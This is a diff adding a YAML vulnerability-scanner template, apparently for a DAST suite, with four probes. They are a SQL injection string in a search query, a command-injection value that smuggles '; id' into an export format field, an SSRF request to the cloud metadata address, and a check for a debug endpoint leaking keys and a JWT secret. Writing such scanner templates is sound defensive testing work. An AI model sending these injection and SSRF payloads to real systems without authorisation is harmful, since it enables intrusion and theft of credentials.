@@ -1,0 +1,56 @@
+id: secureloop-dast-suite
+
+info:
+  name: SecureLoop DAST Dynamic Vulnerability Suite
+  author: SecureLoop Platform
+  severity: high
+  description: Dynamic security testing templates matching MITRE ATT&CK techniques.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/search?q=%27%20OR%20%271%27%3D%271"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "mode\":\"VULNERABLE"
+          - "prod-1"
+        condition: and
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/export"
+    headers:
+      Content-Type: application/json
+    body: '{"filename":"report","format":"txt; id"}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/fetch-url?url=http://169.254.169.254/latest/meta-data/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/debug/config"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "AKIAIOSFODNN7EXAMPLE"
+          - "jwtSecret"
+        condition: and
